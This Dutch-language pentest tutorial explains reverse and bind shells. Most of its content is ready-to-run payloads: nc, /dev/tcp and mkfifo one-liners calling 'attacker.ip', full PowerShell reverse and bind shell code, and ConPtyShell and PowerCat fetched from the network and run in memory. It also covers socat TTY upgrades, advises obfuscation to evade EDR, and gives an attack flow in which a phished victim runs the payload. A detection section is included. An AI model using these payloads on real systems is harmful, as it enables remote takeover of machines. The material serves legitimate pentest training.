## 🎯 Shell Types — Reverse vs Bind

Er zijn **twee primaire methoden** om remote shell access te krijgen:

| Type | Direction | Firewall Impact | Use Case |
|------|-----------|-----------------|----------|
| **Reverse Shell** | Target → Attacker | ✅ Bypasses inbound filtering | Target achter NAT/firewall |
| **Bind Shell** | Attacker → Target | ❌ Blocked door inbound firewall | Direct access mogelijk |

::important
**Reverse shells zijn VEEL vaker gebruikt** omdat de meeste netwerken **outbound traffic** toelaten maar **inbound connections** blokkeren.
::

---

## 🔄 Reverse Shell — Target Verbindt Naar Attacker

### 💡 Hoe Het Werkt

```
┌─────────────────┐           ┌──────────────────┐
│   ATTACKER      │           │   TARGET (victim)│
│   (listener)    │<──────────│   (connects out) │
│   ncat -l 4444  │  Outbound │   /bin/bash      │
└─────────────────┘  traffic  └──────────────────┘
        │                              │
        └──── Gets shell access ───────┘
```

**Waarom dit werkt:**
- Firewalls **blokkeren inbound**, maar **laten outbound door**
- NAT routers laten uitgaande connecties toe
- Target initieert de connectie ("ik bel jou")

::note
**Real-world voorbeeld:** Workplace PC achter corporate firewall. Outbound HTTP/HTTPS is toegestaan. Reverse shell over poort 443 omzeilt firewall restrictions.
::

---

### 🐧 Reverse Shell — Linux Target

#### Met Netcat (traditional, `-e` flag)

**Attacker (listener):**
```bash
ncat -lvnp 4444
```

**Flags uitgelegd:**
- `-l` — Listen mode
- `-v` — Verbose (laat connection info zien)
- `-n` — No DNS lookups
- `-p 4444` — Port 4444

**Target (connects back):**
```bash
nc -e /bin/bash attacker.ip 4444
```

::warning
**Probleem:** Veel moderne `nc` versies hebben **geen `-e` flag** (security redenen).
**Oplossing:** Gebruik alternatieve methoden hieronder.
::

---

#### Zonder `-e` Flag — Bash Redirect

Als `nc` geen `-e` support heeft:

**Methode 1: Named Pipes (mkfifo)**
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.ip 4444 > /tmp/f
```

**Hoe het werkt:**
1. `mkfifo /tmp/f` — Creëert named pipe
2. `cat /tmp/f` — Leest van pipe
3. `/bin/sh -i` — Interactive shell
4. `nc attacker.ip 4444` — Stuurt output naar attacker
5. `> /tmp/f` — Schrijft attacker input terug naar pipe

**Methode 2: Bash Built-in `/dev/tcp`**
```bash
bash -i >& /dev/tcp/attacker.ip/4444 0>&1
```

**Flags:**
- `-i` — Interactive shell
- `>&` — Redirect stdout en stderr
- `0>&1` — Redirect stdin naar stdout

::tip
**Deze werkt bijna altijd** op Linux systemen met Bash!
::

---

#### Met Ncat (modern, recommended)

Ncat ondersteunt diverse exec modes:

**Basic shell:**
```bash
ncat attacker.ip 4444 -e /bin/bash
```

**Interactive shell:**
```bash
ncat attacker.ip 4444 -e /bin/sh
```

**Met shell exec wrapper:**
```bash
ncat attacker.ip 4444 --sh-exec "/bin/bash -i"
```

### 🪟 Reverse Shell — Windows Target

#### Met Ncat

**Attacker (Linux/Kali):**
```bash
ncat -lvnp 4444
```

**Target (Windows cmd.exe):**
```cmd
ncat.exe attacker.ip 4444 -e cmd.exe
```

**PowerShell shell:**
```cmd
ncat.exe attacker.ip 4444 -e powershell.exe
```

---

#### Met PowerShell (geen ncat nodig op target!)

**Methode 1: Basic PowerShell Reverse Shell**

**Attacker (listener):**
```bash
ncat -lvnp 4444
```

**Target (PowerShell one-liner):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker.ip',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

::caution
**Detectie:** PowerShell reverse shells zijn **luid** — EDR en Windows Defender detecteren deze vaak. Gebruik obfuscation in real engagements.
::

---

**Methode 2: ConPtyShell (Fully Interactive - Aanbevolen!)**

ConPtyShell geeft een **fully interactive PowerShell** met tab-completion, command history, etc.

**Attacker (listener met stty):**
```bash
stty raw -echo; (stty size; cat) | ncat -lvnp 87 -s attacker.ip
```

**Target (download & execute ConPtyShell):**
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing)
Invoke-ConPtyShell attacker.ip 87
```

**Hoe het werkt:**
1. `stty raw -echo` — Disable local echo, send raw keystrokes
2. `stty size` — Send terminal dimensions naar target
3. ConPtyShell creëert **pseudo-terminal** op Windows
4. Resultaat: **fully interactive shell** (arrows, tab, Ctrl+C werken!)

::tip
**ConPtyShell is de gold standard** voor Windows reverse shells — voelt aan als echte console!
::

::note
**Bron:** [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) — excellent cheat sheet voor alle shell types!
::

#### Met PowerCat

**Attacker (listener):**
```bash
ncat -lvnp 4444
```

**Target (PowerCat loaded in memory):**
```powershell
# Download & execute in memory:
IEX(New-Object Net.WebClient).DownloadString('http://attacker/powercat.ps1')

# Reverse shell:
powercat -c attacker.ip -p 4444 -e cmd
```

**Alternatief (local script):**
```powershell
Import-Module .\powercat.ps1
powercat -c attacker.ip -p 4444 -e cmd.exe
```

## 🎧 Bind Shell — Attacker Verbindt Naar Target

### 💡 Hoe Het Werkt

```
┌─────────────────┐           ┌──────────────────┐
│   ATTACKER      │           │   TARGET         │
│   (connects)    │──────────>│   (listener)     │
│   ncat IP 4444  │  Inbound  │   ncat -l 4444   │
└─────────────────┘  traffic  └──────────────────┘
        │                              │
        └──── Gets shell access ───────┘
```

**Waarom dit soms faalt:**
- ❌ Firewalls blokkeren **inbound connections**
- ❌ NAT routers zonder port forwarding
- ✅ **Werkt WEL** in datacenters, labs, direct-connected hosts

::warning
**Bind shells zijn LUID** — listening service op unusual port is zeer zichtbaar voor defenders (netstat, port scans, host-based monitoring).
::

---

### 🐧 Bind Shell — Linux Target

**Target (listener met shell):**
```bash
ncat -lvnp 4444 -e /bin/bash
```

**Attacker (connects):**
```bash
ncat target.ip 4444
```

**Zonder `-e` flag (mkfifo methode):**
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 4444 > /tmp/f
```

---

### 🪟 Bind Shell — Windows Target

**Target (listener met cmd.exe):**
```cmd
ncat.exe -lvnp 4444 -e cmd.exe
```

**Attacker (connects):**
```bash
ncat target.ip 4444
```

**PowerShell bind shell:**
```powershell
# Target (listener):
$listener = [System.Net.Sockets.TcpListener]4444;
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close();
$listener.Stop()
```

**Attacker connects:**
```bash
ncat target.ip 4444
```

## ⚖️ Reverse vs Bind — Pros & Cons

### ✅ Reverse Shell

**Pros:**
- ✅ **Bypasses firewalls** — outbound traffic meestal toegestaan
- ✅ **Werkt door NAT** — target initieert connectie
- ✅ **Geen listening service** op target (stealthier)
- ✅ **Meest gebruikt** in real pentests

**Cons:**
- ❌ Attacker moet **listener draaien** (en wachten op callback)
- ❌ Outbound callbacks nog steeds **detecteerbaar** (IDS, proxy logs)
- ❌ Faalt als **egress filtering** alles blokkeert
- ❌ Attacker IP moet **bereikbaar** zijn voor target

---

### 🎧 Bind Shell

**Pros:**
- ✅ **Simpel** te begrijpen en gebruiken
- ✅ Attacker **hoeft niet te wachten** — connect wanneer je wilt
- ✅ **Geen listener** nodig op attacker side

**Cons:**
- ❌ **Vereist inbound access** — faalt achter NAT/firewall
- ❌ **ZEER LUID** — listening service is makkelijk detecteerbaar
- ❌ Veel netcat builds hebben **geen `-e` flag**
- ❌ **Port scan** toont de bind shell direct

---

## 🛡️ Detectie & Security

### Hoe Defenders Reverse Shells Detecteren

| Methode | Wat Ze Zien |
|---------|-------------|
| **Proxy logs** | Outbound connections naar uncommon IPs |
| **Firewall logs** | Traffic naar unusual ports (bijv. 4444, 1337) |
| **IDS/IPS** | Bekend shell patterns in traffic |
| **EDR** | Processes spawning netcat/ncat |
| **PowerShell logging** | Suspicious `System.Net.Sockets` usage |

::important
**Metadata is altijd zichtbaar:**
Zelfs met encryption zie je:
- Destination IP & port
- Connection duration
- Data volume
- Timing patterns
::

---

### Hoe Defenders Bind Shells Detecteren

```bash
# Netstat toont listening services:
netstat -tulnp | grep LISTEN

# Output:
tcp  0.0.0.0:4444  LISTEN  12345/ncat
```

**Andere detection methods:**
- Port scans (Nmap, Masscan)
- Host-based monitoring (osquery, auditd)
- Process monitoring (unusual processes listening)

::warning
**Bind shells zijn ZEER zichtbaar** — gebruik alleen in lab/CTF scenarios.
::

## 🔐 Upgrading Shells — TTY Shells

Simpele reverse shells hebben vaak problemen:
- ❌ Geen tab completion
- ❌ Geen `Ctrl+C` (kill hele shell)
- ❌ Geen text editors (vim/nano)
- ❌ Geen command history

### Python TTY Upgrade

**Na reverse shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Dan:**
```bash
export TERM=xterm
```

**Background shell (Ctrl+Z) en:**
```bash
stty raw -echo; fg
```

**Nu heb je:**
- ✅ Tab completion
- ✅ `Ctrl+C` werkt
- ✅ Vim/nano werken
- ✅ Command history

---

### Socat TTY Shell (proper PTY)

**Attacker (listener met socat):**
```bash
socat -d -d TCP-LISTEN:4444 STDOUT
```

**Target (connect met proper PTY):**
```bash
socat TCP:attacker.ip:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

**Resultaat:**
- ✅ **Volledige interactieve shell**
- ✅ Proper terminal size
- ✅ Alle terminal features werken

::tip
**Socat is de gold standard** voor proper interactive shells in pentests.
::

## 🎯 Real-World Scenario — Corporate Network

### Situatie

```
Internet ─────► [Firewall] ─────► Internal Network
                   │                   │
                   │                   ├─ Workstation (victim)
                   │                   ├─ File Server
                   │                   └─ Database
                   │
              Block inbound
              Allow outbound (HTTP/HTTPS)
```

### Waarom Reverse Shell Werkt

1. **Firewall blokkeert inbound** — bind shell zou falen
2. **Outbound HTTP/HTTPS toegestaan** — reverse shell over poort 443 gaat door
3. **NAT in gebruik** — workstation heeft geen public IP

### Attack Flow

```bash
# 1. Attacker start listener:
ncat -lvnp 443   # Port 443 = HTTPS (vaak toegestaan)

# 2. Victim executes payload (bijv. via phishing):
bash -i >& /dev/tcp/attacker.ip/443 0>&1

# 3. Attacker krijgt shell!
```

# BIND SHELLS
